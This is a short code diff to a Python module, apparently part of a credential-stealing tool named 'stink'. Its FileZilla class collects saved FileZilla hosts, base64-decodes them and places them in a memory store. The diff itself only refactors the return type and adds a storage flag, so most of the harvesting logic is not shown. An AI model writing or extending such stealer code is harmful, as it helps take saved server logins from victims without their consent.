@@ -1,10 +1,10 @@
-from typing import List
 from os import listdir, path
 from base64 import b64decode
 from xml.etree import ElementTree
 
 from stink.helpers import MemoryStorage
 from stink.helpers.config import FileZillaConfig
+from stink.helpers.dataclasses import Data
 
 
 class FileZilla:
@@ -67,7 +67,9 @@ class FileZilla:
             "".join(item for item in temp)
         )
 
-    def run(self) -> List:
+        self.__storage.add_data("FileZilla", True)
+
+    def run(self) -> Data:
         """
         Launches the FileZilla hosts collection module.
 
